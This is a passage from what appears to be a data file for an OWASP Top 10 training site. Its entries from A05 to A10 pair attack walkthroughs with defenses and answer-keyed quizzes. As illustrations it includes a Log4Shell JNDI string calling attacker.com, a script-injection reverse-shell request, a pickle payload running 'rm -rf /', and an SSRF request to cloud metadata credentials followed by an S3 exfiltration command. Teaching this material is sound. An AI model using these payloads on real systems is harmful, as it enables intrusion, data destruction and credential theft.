          'Stack traces automatically downgrade HTTP connections to HTTP/1.0.',
          'It violates typography font licenses.',
        ],
        correctAnswer: 0,
        explanation:
          'Stack traces frequently contain sensitive information such as database connection strings with passwords, internal IP addresses, operating system paths, and source code fragments that assist attackers in crafting exploits.',
      },
      {
        id: 'a05-q2',
        question: 'What is a dangerous CORS (Cross-Origin Resource Sharing) misconfiguration?',
        options: [
          'Setting Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true.',
          'Restricting CORS requests exclusively to your company\'s verified domain.',
          'Disabling CORS completely on static asset endpoints.',
          'Using HTTPS for all cross-origin requests.',
        ],
        correctAnswer: 0,
        explanation:
          'Reflecting or allowing wildcard origins while enabling credentials permits any malicious external website to make authenticated requests to your API and steal private user data.',
      },
      {
        id: 'a05-q3',
        question: 'What is the most effective approach to ensure cloud infrastructure is not misconfigured?',
        options: [
          'Manually clicking through cloud dashboards every Friday afternoon.',
          'Using Infrastructure as Code (Terraform/CloudFormation) combined with automated security scanning in CI/CD.',
          'Never changing any default settings provided by cloud vendors.',
          'Hiding server IP addresses behind secret domain names.',
        ],
        correctAnswer: 1,
        explanation:
          'Infrastructure as Code (IaC) allows teams to define hardened baselines in version control and run automated security linting tools before any server or bucket is deployed.',
      },
    ],
  },
  {
    id: 'A06',
    code: 'A06',
    slug: 'vulnerable-components',
    title: 'Vulnerable and Outdated Components',
    sidebarTitle: 'A06: Vulnerable Components',
    tagline: 'Running third-party libraries, frameworks, or dependencies with known security vulnerabilities.',
    category: 'Supply Chain',
    severity: 'High',
    cwe: 'CWE-1104, CWE-1395',
    iconName: 'PackageX',
    workflow: {
      attackName: 'Known CVE Exploit in Outdated Dependency',
      defenseName: 'Continuous SBOM & Automated Dependency Patching',
      attackSummary: 'Attacker probes public web application, identifies unpatched third-party library with a known CVE (like Log4Shell), and fires public exploit code.',
      defenseSummary: 'Software Bill of Materials (SBOM) and automated CI dependency scanning identify vulnerable libraries before they reach production.',
      attackPayload: 'CVE-2021-44228 Exploit Payload: ${jndi:ldap://attacker.com/exploit}',
      defensePayload: 'Automated Dependabot Pull Request -> Library Upgraded -> CVE Neutralized',
      nodes: [
        { id: 'n1', label: 'Attacker Probe', role: 'CVE Vulnerability Scanner', icon: 'Search' },
        { id: 'n2', label: 'App Endpoint', role: 'Runs Outdated npm/jar Library', icon: 'Box' },
        { id: 'n3', label: 'Known CVE Flaw', role: 'Unpatched Deserialization / RCE', icon: 'Flame' },
        { id: 'n4', label: 'Shell on Server', role: 'Reverse Root Shell Executed', icon: 'Terminal' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Dependency Enumeration',
          actor: 'Attacker Scanner',
          action: 'Attacker inspects client bundles, HTTP headers, or error messages to identify library versions.',
          detail: 'Finds the application is running an unpatched version of an XML or logging library from 2021.',
          payload: 'Fingerprinted: commons-text 1.9 (Vulnerable to CVE-2022-42889)',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Public CVE Research',
          actor: 'Threat Intelligence',
          action: 'Attacker looks up public National Vulnerability Database (NVD) advisory and downloads proof-of-concept exploit.',
          detail: 'Known CVE-2022-42889 provides remote code execution via string interpolation.',
          payload: 'CVE Score: 9.8 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Payload Delivery',
          actor: 'Weaponized Request',
          action: 'Sends HTTP request with exploit string inside a standard search or header parameter.',
          detail: 'The outdated library executes the payload without developer knowledge.',
          payload: 'GET /search?q=${script:javascript:java.lang.Runtime.getRuntime().exec("nc...")}',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Reverse Shell Established',
          actor: 'Compromised Host',
          action: 'The vulnerable library executes the attacker’s command, spawning a remote reverse shell on the production server.',
          detail: 'Application author wrote zero bugs; third-party dependency introduced the vulnerability.',
          payload: 'Root Shell Spawned: uid=0(root) gid=0(root)',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Software Bill of Materials (SBOM)',
          actor: 'Build Pipeline',
          action: 'Maintains an up-to-date inventory of all direct and transitive dependencies across all projects.',
          detail: 'Build tools generate CycloneDX or SPDX SBOM on every commit.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Automated Dependency Scanning',
          actor: 'Security Scanner',
          action: 'Scanners (npm audit, Snyk, Trivy) evaluate dependencies against vulnerability databases in CI/CD.',
          detail: 'Builds are blocked if a dependency has an unpatched High or Critical CVE.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Automated Patch Management',
          actor: 'Bot Automation',
          action: 'Dependabot or Renovate automatically submits pull requests with version bumps and changelog tests.',
          detail: 'Automated test suite validates compatibility before merging.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Attack Surface Reduction',
          actor: 'Hardened Container',
          action: 'Removes unused dependencies, locks package-lock.json, and runs containers with read-only root filesystems.',
          detail: 'Even if an unpatched component is called, the sandbox prevents command execution.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Modern applications are 80-90% third-party open source code (npm, pip, Maven, NuGet packages). When a project uses outdated libraries that contain known security vulnerabilities (CVEs), attackers don’t need to find bugs in your code — they simply search public databases and fire ready-made exploits against your system.',
      analogy:
        'Building a house with reinforced titanium walls, but installing a cheap prefabricated front door from a supplier that recalled 100,000 doors because a universal skeleton key was leaked on the internet.',
      coreImpacts: [
        'Remote code execution (RCE) and total server takeover via known CVEs',
        'Supply chain poisoning and backdoor injection',
        'Data theft via vulnerable deserialization and parsing packages',
      ],
      quickMitigations: [
        'Maintain a continuous Software Bill of Materials (SBOM) for all production software.',
        'Run automated vulnerability scanners (npm audit, Dependabot, Snyk) in your CI/CD pipeline.',
        'Remove unused dependencies, unnecessary features, and obsolete components.',
        'Pin dependency versions and only source packages from trusted, signed registries.',
      ],
    },
    quiz: [
      {
        id: 'a06-q1',
        question: 'Why are vulnerable third-party components particularly dangerous to modern applications?',
        options: [
          'Because open source libraries are not allowed under US copyright law.',
          'Most modern apps consist of 80%+ third-party code; an attacker can exploit public CVEs without finding any flaw in your custom code.',
          'Third-party libraries can only run on Windows 98.',
          'Dependencies make websites load in black and white.',
        ],
        correctAnswer: 1,
        explanation:
          'Modern applications rely heavily on thousands of open-source packages. If even one dependency has a publicly disclosed vulnerability, attackers can download ready-made exploit scripts from GitHub to compromise the app.',
      },
      {
        id: 'a06-q2',
        question: 'What is a Software Bill of Materials (SBOM)?',
        options: [
          'A monthly invoice sent by cloud hosting companies for server compute.',
          'A formal, machine-readable inventory of all software components, dependencies, and libraries used to build an application.',
          'A legal document that waives developer liability for security bugs.',
          'A list of all employees who have write access to the Git repository.',
        ],
        correctAnswer: 1,
        explanation:
          'An SBOM is an exact ingredient list of all packages, libraries, and modules in an application. When a new vulnerability (like Log4Shell) is announced, teams use their SBOM to instantly know if they are affected.',
      },
      {
        id: 'a06-q3',
        question: 'What is the best practice for managing dependencies in a continuous integration (CI) pipeline?',
        options: [
          'Always use wildcard versions like "*" in package.json so you never have to think about versions.',
          'Commit a lockfile (package-lock.json) and run automated CVE security scanning on every build to block vulnerable releases.',
          'Download libraries directly from personal blogs instead of official package registries.',
          'Disable security alerts to avoid slowing down releases.',
        ],
        correctAnswer: 1,
        explanation:
          'Committing lockfiles guarantees reproducible builds, and automated scanners (like npm audit, Snyk, or Trivy) in CI prevent code with known vulnerabilities from being deployed to production.',
      },
    ],
  },
  {
    id: 'A07',
    code: 'A07',
    slug: 'auth-failures',
    title: 'Identification and Authentication Failures',
    sidebarTitle: 'A07: Auth Failures',
    tagline: 'Permitting credential stuffing, brute force, or session hijacking.',
    category: 'Authentication',
    severity: 'High',
    cwe: 'CWE-287, CWE-384',
    iconName: 'UserX',
    workflow: {
      attackName: 'Credential Stuffing & Session Fixation Flow',
      defenseName: 'Multi-Factor Auth (MFA) & Secure Session Rotation',
      attackSummary: 'Attacker runs automated dictionary of leaked passwords against unthrottled login endpoint, bypassing weak single-factor protection.',
      defenseSummary: 'Server enforces Multi-Factor Authentication (MFA), strict rate limits, and rotates session tokens on authentication.',
      attackPayload: 'Automated Bot: 50,000 credential pairs from dark web breach against /api/login',
      defensePayload: 'Rate Limit (429) + Enforce TOTP/FIDO2 MFA + Rotate Session ID',
      nodes: [
        { id: 'n1', label: 'Breach Database', role: 'Leaked Combo List', icon: 'Database' },
        { id: 'n2', label: 'Unthrottled Login', role: 'No Rate Limit / No MFA', icon: 'LogIn' },
        { id: 'n3', label: 'Session Fixation', role: 'Token Reused After Auth', icon: 'Key' },
        { id: 'n4', label: 'Hijacked Account', role: 'Attacker Masquerades as User', icon: 'UserCheck' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Credential Stuffing Setup',
          actor: 'Attacker Script',
          action: 'Loads 50,000 username/password combos obtained from an unrelated dark web breach.',
          detail: 'Relies on human tendency to reuse passwords across multiple personal and corporate services.',
          payload: 'Combo: john.doe@work.com : Summer2024!',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Automated Login Spray',
          actor: 'Botnet Cluster',
          action: 'Fires distributed login requests through residential proxies to bypass naive IP bans.',
          detail: 'Login endpoint lacks rate limiting, CAPTCHA, or anomaly detection.',
          payload: 'POST /api/v1/auth/login (120 attempts / min)',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Valid Match & Single-Factor Pass',
          actor: 'Auth Backend',
          action: 'Password matches for 3% of users. Since MFA is not required, system issues session immediately.',
          detail: 'Attacker logs in without needing to crack encryption or exploit code bugs.',
          payload: 'Response: 200 OK — Set-Cookie: sid=abc12345',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Session Hijack & Takeover',
          actor: 'Attacker Browser',
          action: 'Session cookie is not marked HttpOnly or rotated, enabling session fixation and full account usurpation.',
          detail: 'Attacker accesses sensitive corporate accounts and changes recovery emails.',
          payload: 'Authenticated as: Director of Finance',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Multi-Factor Authentication (MFA)',
          actor: 'Auth Guard',
          action: 'Requires second factor (FIDO2 WebAuthn or TOTP app) for all logins.',
          detail: 'Leaked passwords alone are useless to an attacker.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Adaptive Rate Limiting & Lockout',
          actor: 'API Gateway',
          action: 'Applies token bucket rate limits per account and per IP with CAPTCHA step-up on failed attempts.',
          detail: 'Automated brute-force scripts are blocked within 5 attempts.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Breached Password Checking',
          actor: 'Password Validator',
          action: 'Checks new passwords against haveibeenpwned k-anonymity API to prevent reused passwords (NIST SP 800-63B).',
          detail: 'Users cannot select known compromised passwords.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Cryptographic Session Management',
          actor: 'Session Service',
          action: 'Issues 128-bit random session IDs, flags cookies as HttpOnly, Secure, SameSite=Strict, and rotates on login.',
          detail: 'Old session tokens are instantly revoked.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Identification and authentication failures occur when applications do not properly confirm the identity of a user, permit automated credential stuffing, or mishandle session tokens. This enables attackers to guess passwords, reuse stolen passwords from other sites, or steal valid user sessions.',
      analogy:
        'A bank teller who accepts a photocopy of an ID badge without verifying the person standing in front of them, and allows a customer to guess a 4-digit PIN an unlimited number of times until they get it right.',
      coreImpacts: [
        'Mass account takeover through credential stuffing bots',
        'Session hijacking via stolen or fixated session tokens',
        'Impersonation of high-privilege administrators',
      ],
      quickMitigations: [
        'Implement Multi-Factor Authentication (MFA) as a mandatory requirement for all accounts.',
        'Implement rate limiting and account lockout after multiple consecutive failed attempts.',
        'Never permit default passwords; reject passwords found in known breach databases (NIST guidelines).',
        'Store session tokens in secure, HttpOnly, SameSite cookies and rotate them upon authentication.',
      ],
    },
    quiz: [
      {
        id: 'a07-q1',
        question: 'What is "Credential Stuffing"?',
        options: [
          'Overfilling an HTML password form until the web server crashes.',
          'Automated testing of millions of username/password pairs leaked from past third-party data breaches against another service.',
          'Encrypting passwords using two different algorithms simultaneously.',
          'Sending phishing emails that pretend to be a delivery company.',
        ],
        correctAnswer: 1,
        explanation:
          'Because many users reuse the same password across multiple websites, attackers take username/password dumps from previous breaches and run automated bots to test those exact combinations on other banking, retail, and social websites.',
      },
      {
        id: 'a07-q2',
        question: 'Why should session cookies always have the "HttpOnly" flag set?',
        options: [
          'To ensure the cookie can only be sent over HTTP and never over HTTPS.',
          'To prevent client-side JavaScript (e.g. from an XSS attack) from reading the sensitive session cookie.',
          'To compress cookie data so requests transfer faster.',
          'To allow search engines to index session data.',
        ],
        correctAnswer: 1,
        explanation:
          'The HttpOnly flag instructs the browser that document.cookie cannot be accessed by JavaScript. If an attacker discovers an XSS vulnerability, they cannot directly extract the session cookie.',
      },
      {
        id: 'a07-q3',
        question: 'What should a web application do with an existing session ID when a user successfully logs in?',
        options: [
          'Keep the exact same session ID forever for convenience.',
          'Destroy the old session ID and issue a completely new, cryptographically random session ID (Session Rotation).',
          'Encode the session ID in the browser URL hash.',
          'Email the session ID to the user for verification.',
        ],
        correctAnswer: 1,
        explanation:
          'Rotating session IDs upon successful authentication prevents Session Fixation attacks, where an attacker pre-sets a victim’s session token before login to hijack the session once authenticated.',
      },
    ],
  },
  {
    id: 'A08',
    code: 'A08',
    slug: 'integrity-failures',
    title: 'Software and Data Integrity Failures',
    sidebarTitle: 'A08: Integrity Failures',
    tagline: 'Trusting unverified updates, unsigned code, or unsafe deserialization.',
    category: 'Integrity',
    severity: 'High',
    cwe: 'CWE-494, CWE-502, CWE-829',
    iconName: 'FileWarning',
    workflow: {
      attackName: 'Tampered Update & Insecure Deserialization Attack',
      defenseName: 'Cryptographic Signatures & Safe Data Serialization',
      attackSummary: 'Attacker compromises update server or injects malicious serialized object into application pipeline without signature verification.',
      defenseSummary: 'Cryptographic digital signatures (GPG, Cosign) verify artifact provenance, and untrusted input is parsed with strict schemas (JSON).',
      attackPayload: 'Untrusted Object: java.lang.Runtime / Python pickle object with embedded shellcode',
      defensePayload: 'Verify RSA-4096 / Ed25519 Signature + Strict JSON Schema Validation',
      nodes: [
        { id: 'n1', label: 'Poisoned Update', role: 'Compromised CDN / Mirror', icon: 'Globe' },
        { id: 'n2', label: 'Unsigned Client', role: 'No Signature Check', icon: 'DownloadCloud' },
        { id: 'n3', label: 'Deserializer', role: 'Executes Code on Object Hydration', icon: 'FileCode' },
        { id: 'n4', label: 'RCE Backdoor', role: 'Persistent Trojan in Memory', icon: 'AlertTriangle' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Update Channel Tampering',
          actor: 'Attacker Intermediary',
          action: 'Attacker compromises an unpinned CDN or performs DNS spoofing on an auto-updater feed.',
          detail: 'Replaces legitimate v2.4 installer with a trojanized binary.',
          payload: 'Trojanized update: app_v2.4_patch.exe',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Missing Signature Verification',
          actor: 'Client Auto-Updater',
          action: 'Application downloads file and executes installer without verifying cryptographic digital signatures or hashes.',
          detail: 'System trusts the transport protocol alone rather than cryptographic object provenance.',
          payload: 'Verification: Signature check NOT implemented',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Insecure Deserialization Exploit',
          actor: 'Payload Hydration',
          action: 'App deserializes untrusted payload using native deserializers (Java ObjectInputStream, Python pickle).',
          detail: 'Magic methods (__reduce__, readObject) execute arbitrary code during object instantiation.',
          payload: 'pickle.loads(b"cos\nsystem\n(S\'rm -rf /\'\ntR.")',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Persistent Supply Chain Breach',
          actor: 'Infected Host',
          action: 'Attacker payload establishes persistent root access and exfiltrates proprietary source code.',
          detail: 'SolarWinds-style supply chain compromise achieved through integrity failure.',
          payload: 'Backdoor Active: C2 Beacon Established',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Cryptographic Code Signing',
          actor: 'Build System',
          action: 'Signs all release artifacts and containers using hardware-backed private keys (e.g. Cosign/Notary).',
          detail: 'Public key is pinned inside client binaries.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Signature & Checksum Verification',
          actor: 'Installer Client',
          action: 'Validates SHA-256 hash and Ed25519 signature before saving or running any downloaded update.',
          detail: 'Tampered binaries are rejected immediately before execution.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Safe Data Serialization Formats',
          actor: 'API Architecture',
          action: 'Replaces dangerous native deserializers with pure data formats (JSON, Protocol Buffers) and strict schemas.',
          detail: 'Data formats cannot instantiate live code objects.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'CI/CD Pipeline Integrity',
          actor: 'Build Security',
          action: 'Enforces branch protection, multi-party reviews, and ephemeral hermetic build environments.',
          detail: 'Unauthorized code changes cannot enter the deployment stream.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. Examples include relying on plugins, libraries, or auto-updates from untrusted sources without cryptographic signatures, or deserializing untrusted raw objects that can execute arbitrary code upon reading.',
      analogy:
        'Receiving a package in the mail with the tamper-evident security seal ripped off and a handwritten label from an unknown stranger, but opening it and drinking the contents anyway without checking if it was poisoned.',
      coreImpacts: [
        'Remote Code Execution (RCE) through insecure deserialization of objects',
        'Supply chain backdoors planted via unverified auto-updates',
        'Tampering with critical financial transaction records or audit logs',
      ],
      quickMitigations: [
        'Cryptographically sign all firmware, container images, and software updates using digital signatures.',
        'Never use native language deserializers (Python pickle, Java Serializable) on untrusted user data.',
        'Use strict serialization formats like JSON with explicit schema validation (e.g. Zod).',
        'Ensure CI/CD pipelines require signed commits, peer reviews, and verifiable build provenance.',
      ],
    },
    quiz: [
      {
        id: 'a08-q1',
        question: 'Why is deserializing untrusted user data using Python "pickle" or Java native serialization extremely dangerous?',
        options: [
          'It can trigger remote code execution automatically during the deserialization process without calling any extra function.',
          'It causes all text to be converted into uppercase.',
          'It deletes the user’s browser history.',
          'Pickle files are incompatible with Linux servers.',
        ],
        correctAnswer: 0,
        explanation:
          'Native deserialization engines reconstruct live code objects in memory. Injected gadget chains or custom magic methods (like __reduce__ in Python) execute arbitrary system commands the moment the data is unpacked.',
      },
      {
        id: 'a08-q2',
        question: 'How should an auto-update feature verify that a downloaded update file was not tampered with in transit?',
        options: [
          'By checking if the file ends with the ".exe" or ".dmg" extension.',
          'By verifying the file against a trusted cryptographic digital signature and pinned public key.',
          'By sending an unencrypted HTTP ping to Google.',
          'By re-downloading the file twice and seeing if the file sizes match.',
        ],
        correctAnswer: 1,
        explanation:
          'Cryptographic signatures (e.g. RSA or Ed25519) allow the client to verify mathematical proof that the file was created by the authentic publisher and has not been altered by a single bit.',
      },
      {
        id: 'a08-q3',
        question: 'Which data format is inherently safer against deserialization attacks for web APIs?',
        options: [
          'JSON or Protocol Buffers parsed with a strict schema.',
          'Java ObjectInputStream reading raw binary streams.',
          'Python pickle files over HTTP POST.',
          'PHP serialize() data in cookies.',
        ],
        correctAnswer: 0,
        explanation:
          'JSON and Protocol Buffers are pure data-interchange formats. They represent numbers, strings, and arrays without language-specific executable classes, preventing code execution during parsing.',
      },
    ],
  },
  {
    id: 'A09',
    code: 'A09',
    slug: 'logging-failures',
    title: 'Security Logging and Monitoring Failures',
    sidebarTitle: 'A09: Logging Failures',
    tagline: 'Attacks and data breaches occurring completely undetected for months.',
    category: 'Operations',
    severity: 'Medium',
    cwe: 'CWE-117, CWE-223, CWE-532',
    iconName: 'Activity',
    workflow: {
      attackName: 'Silent Intrusion & Undetected Breach Flow',
      defenseName: 'Centralized SIEM, Structured Telemetry & Alerts',
      attackSummary: 'Attacker launches massive brute-force and privilege escalation attacks, but zero logs are stored and operations team remains oblivious.',
      defenseSummary: 'Structured events stream to immutable SIEM; automated alerting triggers instant incident response on threshold anomalies.',
      attackPayload: '5,000 failed admin login probes -> Unlogged / Silently discarded in catch block',
      defensePayload: 'Structured JSON log -> SIEM Rule: >10 failures/min -> Slack/PagerDuty Alert',
      nodes: [
        { id: 'n1', label: 'Silent Attacker', role: 'Brute-Force & Exfiltration', icon: 'EyeOff' },
        { id: 'n2', label: 'Vulnerable App', role: 'Empty catch { } block', icon: 'Server' },
        { id: 'n3', label: 'Local Text Log', role: 'Unmonitored / Overwritten', icon: 'FileText' },
        { id: 'n4', label: 'Undetected Breach', role: 'Dwell Time: 200+ Days', icon: 'Clock' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Brute-Force Probe',
          actor: 'Adversary',
          action: 'Attacker executes automated password spraying and unauthorized API probes across 5,000 requests.',
          detail: 'Probes trigger hundreds of authentication and authorization exceptions.',
          payload: '5,000 401 Unauthorized events generated',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Silent Error Suppression',
          actor: 'Flawed Code',
          action: 'Developers wrapped security logic in empty catch blocks: catch (e) { /* do nothing */ }',
          detail: 'Neither security events, IP addresses, nor user IDs are recorded.',
          payload: 'Silent catch: No log written',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Absence of Monitoring & Alerts',
          actor: 'Security Operations',
          action: 'Security Operations Center (SOC) receives zero notifications because no monitoring rules exist.',
          detail: 'Logs, if any, are written to ephemeral local server disks that rotate and erase every 24 hours.',
          payload: 'Alerts triggered: 0',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Massive Dwell Time & Exfiltration',
          actor: 'Persistent Threat',
          action: 'Attacker operates inside the internal network for over 200 days, exfiltrating the entire database.',
          detail: 'Breach is only discovered when external law enforcement or customers notify the company.',
          payload: 'Average Industry Dwell Time: 204 Days Undetected',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Structured Security Telemetry',
          actor: 'Application Logger',
          action: 'Logs all authentication attempts, privilege changes, and access control rejections in structured JSON.',
          detail: 'Records timestamp, actor ID, IP, user-agent, and outcome without logging passwords or PII.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Append-Only Centralized SIEM',
          actor: 'Log Aggregator',
          action: 'Streams logs in real time to an isolated, append-only SIEM (e.g. Datadog, Splunk, Elastic).',
          detail: 'Attacker cannot tamper with or delete logs even if application server is compromised.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Real-Time Anomaly Alerting',
          actor: 'Detection Engine',
          action: 'Triggers high-priority alerts when thresholds are crossed (e.g., >10 failed logins per account in 5 minutes).',
          detail: 'Integrates with PagerDuty and incident response team immediately.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Immediate Threat Containment',
          actor: 'SOC Team',
          action: 'Security team isolates compromised session within 15 minutes of initial probe.',
          detail: 'Breach is contained before sensitive data can be exfiltrated.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Logging and monitoring failures happen when applications fail to record security events (like login attempts, authorization rejections, or high-value transactions), or fail to alert human operators when attacks are actively occurring. Without logging, breaches go unnoticed for hundreds of days.',
      analogy:
        'A museum with a security alarm system that has dead batteries and severed speaker wires. Thieves can smash the display cases all night, and the guards sleeping in the next room won\'t hear a thing.',
      coreImpacts: [
        'Prolonged attacker dwell time (industry average over 200 days)',
        'Inability to perform post-incident digital forensics to determine what data was stolen',
        'Regulatory non-compliance with legal incident reporting mandates',
      ],
      quickMitigations: [
        'Log all authentication, authorization failures, and server-side input validation errors.',
        'Use structured formats (JSON) with timestamps, actor IDs, IP addresses, and request correlation IDs.',
        'Forward logs to an append-only, tamper-proof centralized SIEM platform.',
        'Never log sensitive data such as passwords, payment cards, or personally identifiable information (PII).',
      ],
    },
    quiz: [
      {
        id: 'a09-q1',
        question: 'Which of the following items should NEVER be written into application log files?',
        options: [
          'User session IDs and plaintext passwords.',
          'HTTP response status codes (e.g. 403, 500).',
          'Timestamp of the request.',
          'The endpoint URL requested (e.g. /api/invoices).',
        ],
        correctAnswer: 0,
        explanation:
          'Logs must never contain passwords, full credit card numbers, or session tokens. If logs are read by developers or exposed, stored passwords will lead to secondary data breaches.',
      },
      {
        id: 'a09-q2',
        question: 'Why should logs be forwarded in real time to a centralized log management system (SIEM)?',
        options: [
          'Because local logs slow down the server\'s CPU by 90%.',
          'If an attacker compromises the web server, they will attempt to delete or tamper with local log files to cover their tracks; centralized logs remain protected.',
          'Centralized logging is required to run CSS stylesheets.',
          'SIEM tools automatically write code for developers.',
        ],
        correctAnswer: 1,
        explanation:
          'Adversaries immediately delete /var/log entries when compromising a server. An isolated, append-only centralized log store ensures the audit trail cannot be modified or destroyed by an intruder.',
      },
      {
        id: 'a09-q3',
        question: 'What is "Dwell Time" in cybersecurity?',
        options: [
          'The time it takes to boot up a Linux virtual machine.',
          'The duration of time an attacker remains undetected inside a compromised network before being discovered.',
          'The timeout period for an idle browser tab.',
          'The duration of an SSL handshake.',
        ],
        correctAnswer: 1,
        explanation:
          'Dwell time is the duration between an attacker\'s initial compromise and the time security teams detect them. Without proper logging and monitoring, the global average dwell time exceeds 200 days.',
      },
    ],
  },
  {
    id: 'A10',
    code: 'A10',
    slug: 'ssrf',
    title: 'Server-Side Request Forgery (SSRF)',
    sidebarTitle: 'A10: SSRF',
    tagline: 'Abusing web servers to fetch internal network resources and cloud credentials.',
    category: 'Network',
    severity: 'High',
    cwe: 'CWE-918',
    iconName: 'Radio',
    workflow: {
      attackName: 'Cloud Metadata Exfiltration via SSRF',
      defenseName: 'Strict URL Allowlisting & Network Isolation',
      attackSummary: 'Attacker supplies internal cloud metadata IP (169.254.169.254) to an image fetcher/webhook endpoint, tricking the server into returning cloud IAM keys.',
      defenseSummary: 'Server validates protocol, resolves DNS, rejects private IP ranges (RFC 1918 & link-local), and disables IMDSv1.',
      attackPayload: 'POST /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      defensePayload: 'Block Private IP (169.254.169.254) -> Reject Request (HTTP 400)',
      nodes: [
        { id: 'n1', label: 'External Attacker', role: 'Sends Crafted URL', icon: 'Send' },
        { id: 'n2', label: 'Vulnerable App', role: 'Fetches Arbitrary URLs', icon: 'Server' },
        { id: 'n3', label: 'Internal Network', role: 'AWS Cloud Metadata Service', icon: 'Cloud' },
        { id: 'n4', label: 'IAM Secrets Exfiltrated', role: 'Full AWS Cloud Account Takeover', icon: 'Key' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Identification of URL Feature',
          actor: 'Attacker Recon',
          action: 'Finds a feature where the server downloads an image or webhook URL provided by the user (e.g. /api/import-avatar).',
          detail: 'Feature takes a URL parameter and issues an HTTP GET request from the backend server.',
          payload: 'POST /api/import-avatar {"url": "http://169.254.169.254/..."}',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Internal Target Addressing',
          actor: 'Malicious Request',
          action: 'Submits the cloud provider internal metadata IP address (169.254.169.254) instead of an external image link.',
          detail: 'This link-local IP is only accessible from inside the cloud virtual machine, not from the public internet.',
          payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Server-Side Request Execution',
          actor: 'Vulnerable Backend',
          action: 'Server issues the request behind its own firewall. The metadata service trusts the internal request.',
          detail: 'The cloud metadata service responds with temporary AWS IAM secret access keys.',
          payload: 'Metadata Response: {"AccessKeyId": "ASIA...", "SecretAccessKey": "wJalr..."}',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Full Cloud Account Hijacking',
          actor: 'Exfiltrated Data',
          action: 'Attacker receives IAM credentials in the response and logs into AWS CLI to control cloud resources.',
          detail: 'Capital One-style breach executed by weaponizing SSRF against cloud infrastructure.',
          payload: 'aws s3 sync s3://company-production-bucket ./loot',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Strict Destination Allowlisting',
          actor: 'URL Validator',
          action: 'Only permits connections to explicit pre-approved domains and schemes (e.g. https://trusted-cdn.com).',
          detail: 'Rejects all raw IP addresses and non-HTTP protocols (file://, gopher://).',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'DNS Resolution & IP Verification',
          actor: 'Network Guard',
          action: 'Resolves domain to IP before connection and blocks RFC 1918 private ranges (10.x, 172.16.x, 192.168.x, 127.0.0.1, 169.254.x).',
          detail: 'Prevents DNS Rebinding attacks by pinning resolved IP.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Cloud Metadata Hardening (IMDSv2)',
          actor: 'Cloud Infrastructure',
          action: 'Enforces AWS IMDSv2 requiring a pre-flight PUT token request with hop limits (TTL=1).',
          detail: 'Simple SSRF GET requests cannot obtain IAM tokens.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Network Segmentation & Firewall',
          actor: 'Egress Filter',
          action: 'Firewall denies egress traffic to private internal subnets from internet-facing web tier.',
          detail: 'Attack packets are dropped at the network boundary.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource (like an image URL or webhook) supplied by the user without validating the destination. An attacker can force the server to send HTTP requests to internal services, local databases (localhost), or cloud metadata services that were never intended to be exposed to the internet.',
      analogy:
        'Tricking an office courier into going to the CEO’s private filing cabinet in the back of the building, grabbing confidential documents, and mailing them back out to you because the courier was instructed to "fetch any paper requested".',
      coreImpacts: [
        'Theft of cloud instance metadata and IAM temporary credentials',
        'Port scanning and access to unauthenticated internal microservices',
        'Reading local server files via alternative URI schemes (e.g., file:///etc/passwd)',
      ],
      quickMitigations: [
        'Enforce strict allowlists for protocols (HTTPS only) and destination domain names.',
        'Resolve DNS and explicitly block all private, loopback, and link-local IP addresses (127.0.0.1, 169.254.169.254, RFC 1918).',
